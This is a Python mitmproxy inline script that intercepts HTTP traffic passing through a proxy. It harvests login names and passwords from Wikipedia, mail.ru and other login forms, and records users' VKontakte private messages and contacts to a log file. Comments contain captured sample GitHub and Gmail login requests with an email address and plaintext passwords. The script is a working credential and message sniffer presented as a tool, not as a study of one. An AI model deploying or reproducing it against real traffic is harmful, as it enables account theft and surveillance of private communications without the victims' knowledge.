import logging
import time
import cStringIO
from PIL import Image
from libmproxy.protocol.http import decoded
import re
import urllib # Russian messages support
from sets import Set

logging.basicConfig(filename="/root/mitm.log",level=logging.DEBUG)

class VK_user:
    def __init__(self):
        self.id = ""
        self.peers = {}
        self.messages = []

    def __repr__(self):
        s = "\n"
        s += "User vk id = " + str(self.id) + "\n"
        for peer in self.peers.keys():
            s += "\tpeer " + peer + ": "
            for hs in list(self.peers[peer]):
                s += hs + "  |  "
            s += "\n"
        s += "\n"
        s += "User     |       Topic       | Message\n"
        for m in self.messages:
            s += str(m[1]) + "  " + str(m[2]) + "  " +  str(m[0]) + "\n"
        s += "\n"
        return s

class VK_data:
    def __init__(self):
        self.users = {}
        self.current_user = ""
        # temp user to store data if we do not currently know the id
        self.on_new_id("temp")
        
    def from_a_typing(self, string):
        m = re.match(r"act=a_typing&al=(?P<al>\d+)&gid=(?P<gid>\d+)&hash=(?P<hash>\w+)&peer=(?P<peer>\d+)", string)
        if not m:
            logging.debug("from_a_typing: Failed to parse " + string)
            return 0

        logging.debug("Typing: al = " + m.group('al') + " gid = " + m.group('gid') + 
                      " hash = " + m.group('hash') + " peer = " + m.group('peer'))
        
        if m.group('peer') not in self.users[self.current_user].peers.keys():
            self.users[self.current_user].peers[m.group('peer')] = Set([])
        self.users[self.current_user].peers[m.group('peer')].add(m.group('hash'))
 
        return 1

        
    def from_a_send(self, string):
        m = re.match((r"act=a_send&al=(?P<al>\d+)&gid=(?P<gid>\d+)&guid" +
              "=(?P<guid>\d+\.?\d*)&hash=(?P<hash>\w+)&media=(?P" +
              "<media>\w*)&msg=(?P<msg>[\w\W]*)&title=(?P<title>\w*)" +
              "&to=(?P<to>\d+)&ts=(?P<ts>\d+)"), string, re.UNICODE)
        if not m:
            logging.debug(string)
            return 0

        logging.debug("al = " + m.group('al'))
        logging.debug("gid = " + m.group('gid'))
        logging.debug("guid = " + m.group('guid'))
        logging.debug("hash = " + m.group('hash'))
        logging.debug("media = " + m.group('media'))
        logging.debug("msg = " + m.group('msg'))
        logging.debug("title = " + m.group('title'))
        logging.debug("to = " + m.group('to'))
        logging.debug("ts = " + m.group('ts'))

        if m.group('to') not in self.users[self.current_user].peers.keys():
            self.users[self.current_user].peers[m.group('to')] = Set([])
        self.users[self.current_user].peers[m.group('to')].add(m.group('hash'))

        self.users[self.current_user].messages.append([m.group('msg'), m.group('to'), m.group('hash')])

        logging.debug(str(self.users[self.current_user]))

        return 1

    def from_a_check(self, string):
        m_key = re.match(r"act=a_check&key=[\w\W]*", string, re.UNICODE)
        m_id  = re.match(r"act=a_check&id=(?P<id>\d+)&[\w\W]*", string, re.UNICODE)

        if m_key:
            return 1

        if m_id:
            logging.debug("[a_check]: Found my id: " + m_id.group('id'))
            self.on_new_id(m_id.group('id'))
            return 1
        
        logging.debug(string)
        return 0

    def decode(self, string):
        string = urllib.unquote(string).decode('utf-8')
        m = re.match(r"act=(?P<type>\w+)&\w+", string)
        if not m:
            return 0
        
        if m.group('type') == "a_typing":
            return self.from_a_typing(string)

        if m.group('type') == "a_send":
            return self.from_a_send(string)
        
        if m.group('type') == "a_check":
            return self.from_a_check(string)
        
        # No-info types
        if m.group('type') == "pad":
            return 1
        
        if m.group('type') == "a_friends":
            return 1
        
        if m.group('type') == "a_onlines":
            return 1

        logging.debug("Unable to decode type " + m.group('type') 
                      + "! " + string)
        return 0


    def on_new_id(self, my_id):
        if my_id not in self.users.keys():
            self.users[my_id] = VK_user()
            self.users[my_id].id = my_id

        if (self.current_user == "temp") and (my_id != "temp"):
            self.users[my_id] = self.users["temp"]
            self.users[my_id].id = my_id
            self.users["temp"] = VK_user()

        self.current_user = my_id

        logging.debug("Known my_ids: " + str(self.users.keys())) 
        logging.debug("Current my_id: " + str(self.current_user)) 
     
class PW_data:
    def __init__(self):
        self.passwords = []

    def sniff_passwords(self, string):
        if ("assword" not in string) and ("asswd" not in string):
            return

        # Wiki 
        m = re.match(r"wpName=(?P<login>[^&]*)&wpPassword=(?P<password>[^&]*)&[\w\W]*", string)
        if (m):
            self.passwords.append(["wikipedia.org", m.group('login'), m.group('password')])
            logging.debug(str(self))
            return

        # Mail.ru
        m = re.match(r"Login=(?P<login>[^&]*)&Domain=(?P<domain>[^&]*)&Password=(?P<password>[^&]*)&[\w\W]*", string)
        if (m):
            self.passwords.append(["mail.ru", m.group('login')+'@'+m.group('domain'), m.group('password')])
            logging.debug(str(self))
            return
       
        # Github
#utf8=%E2%9C%93&authenticity_token=FxDr3tOYPoVqX1P7bqI4PE9Yfh9%2BckALWtSfoGuoiXAGXS65vt1WO6LGCmSVrJKHy1kgo7K61PrfsRazuBLCyA%3D%3D&login=ncos&password=gggggg&return_to=%2Fnucobot%2Flisa%2Fnetwork
        # Gmail
#GALX=Y0tGWfxW2kY&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F%3Ftab%3Dwm&service=mail&ltmpl=default&scc=1&checkedDomains=youtube&checkConnection=youtube%3A1117%3A1&pstMsg=1&sacu=1&acui=0&_utf8=%E2%98%83&bgresponse=%21-_hCwFHnDqxfv7pEtM9vz5FS65oCAAAAZVIAAAAoKgEysjXjxfppPbUbKHvhVL393ZCqmZDrVE1OQRHxOnkJTrqrzstQC1d85Rs9UrPd-OOY0Gmc3tA_HfgUE4e4CKN94OybWKuDYEhYu2Tzsf8aecFKSnD408zxqXEoJAz8wtlk9ypYPd2liZgTu5s36aUs1pKdI0MZdym4AuFmHsCagyFqA50hY65_IBr44ty3i2ssEllANd4hE2-6JxrIkOf9EHbdwDqSXhq5npHfQmnS93D3wGzK22Z4Jt8LtPx2RxR8MrLuVL2d4qm1tL9VEVbCLLhPokqjxs2j0Vf00lBTbLAKUTPz1DZr4GpxEozDQ0GkU2Dee5Z3ow1X1-4sbBaLnzQ22ZSzUwF2gwApO7mVGqsIicJZDFXvMpS-WwtAFMWXh9aWciA33rHPzHxrfDzYFs99&pstMsg=1&dnConn=&checkConnection=youtube%3A455%3A1&checkedDomains=youtube&Email=anton.ncos%40gmail.com&Passwd=0000000&PersistentCookie=yes&signIn=Sign+in 



        # Other websites
        self.passwords.append(["?", string, ""])
        logging.debug(str(self))

    def __repr__(self):
        s = '\n'
        s += "website".ljust(20) + "login".ljust(20) + "password".ljust(20) + '\n'
        for entry in self.passwords:            
            s += entry[0].ljust(20)+entry[1].ljust(20)+entry[2].ljust(20) + '\n'
        s += '\n'
        return s
        

vk_db = VK_data()
pw_db = PW_data()



def request(context, flow):
    try:
        with decoded(flow.request):  # automatically decode gzipped responses.
            pw_db.sniff_passwords(str(flow.request.content))
            vk_db.decode(str(flow.request.content))

    except Exception as e:
        logging.debug(e)

def start (context, argv):
    logging.debug("============================================\n")
    logging.debug(time.time())
    logging.debug("Startup:\n")
    context.log("start")

